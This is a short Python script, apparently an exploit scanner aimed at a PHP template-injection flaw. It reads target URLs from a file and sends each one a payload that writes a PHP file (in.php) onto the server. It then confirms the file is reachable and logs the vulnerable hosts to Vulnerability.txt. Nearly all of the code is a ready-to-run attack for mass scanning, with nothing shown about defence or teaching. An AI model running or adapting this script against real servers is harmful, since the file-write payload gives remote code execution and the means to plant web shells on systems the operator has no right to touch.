import requests
import urllib.parse
import pandas as pd
import time

def az(urls):
	try:
		cc = urls+ ("?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('in.php','<?php phpinfo();?>')</php>")
		res=requests.get(url =cc)
		res.raise_for_status()
	except requests.RequestException as e:
		print(e)	
	else:
		time.sleep(1)
		dd = urls+ '/in.php'
		res1 = requests.get(url = dd)
	    #睡眠5秒   防止请求没完成


		if res1.status_code == 200:
			time_format = '%Y-%m-%d %X'
			#s = time.strftime(time_format, time.localtime()) #获取当前系统时间
			#print(s)
			print(dd)
			with open('Vulnerability.txt', mode='a', encoding='utf-8') as f:
				f.write(urls+'\n')

def main():
	print("")
	print("　　　　　　　＃＃＃　　　　　　　　　　　　　　　＃＃＃　　　　　　　＃＃＃　　")
	print("　　　　　　　＃＃＃　　　　　　　　　　　　　　　＃＃＃　　　　　　　＃＃＃　　")
	print("　　　　　　＃＃＃＃　　　　　　　　　　　　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　　　＃＃＃＃＃　　　　　＃＃＃＃＃　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　　　＃＃　＃＃　　　　　　　　＃＃　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　　＃＃＃　＃＃　　　　　　　＃＃＃　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　　＃＃＃＃＃＃　　　　　　　＃＃　　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　　＃＃＃＃＃＃＃　　　　　＃＃　　　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　　＃＃　　　＃＃　　　　＃＃＃　　　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　＃＃＃　　　＃＃　　　　＃＃　　　　　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　＃＃　　　　＃＃＃　　　＃＃＃＃＃＃　　　　＃＃　　　　　　　　＃＃　　")
	print("　　　　＃＃　　　　＃＃＃　　　　　　　　　　　　＃＃＃　　　　　　　＃＃＃　　")
	print("　　　　　　　　　　　　　　　　　　　　　　　　　＃＃　　　　　　　　＃＃　　　")
	print("　　　　　　　　　　　　　　　　　　　　　　　　　＃　　　　　　　　　＃　　　　")
	url_lst=[]
	#     f=open('ip.txt',encoding='utf8')
	f = pd.read_csv(open(r'url.txt'))
	#     ip_str=f.readlines()
	for u in list(f['U']):
	    u=u.replace(' ', '')
	    u=u.replace('\n', '')
	    u_lst=[u]
	    url_lst=url_lst+u_lst
	for i in url_lst:
		az(i)
if __name__ == '__main__':
    main()